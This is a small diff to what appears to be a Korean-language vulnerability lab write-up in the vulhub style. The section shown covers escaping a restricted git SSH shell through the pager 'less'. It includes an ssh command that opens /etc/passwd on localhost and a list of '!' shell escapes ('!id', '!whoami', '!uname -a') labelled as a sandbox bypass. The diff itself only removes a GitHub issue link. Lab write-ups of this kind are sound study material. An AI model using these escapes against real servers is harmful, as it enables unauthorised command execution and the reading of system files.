@@ -63,7 +63,6 @@ ssh -p 3322 -i id_rsa -t git@127.0.0.1 "less /etc/passwd"
 
 ### 3.2 명령어 실행 (sandbox 우회)
 • !id -> 사용자 ID, 그룹 ID 출력
-https://github.com/suz1n/WHS3_vulhub/issues/1#issue-3023144293
 • !whoami -> 현재 사용자(git)
 • !uname -a -> 시스템 커널 정보 출력
 • !ls /home/git -> git 홈 디렉토리 파일 목록 출력
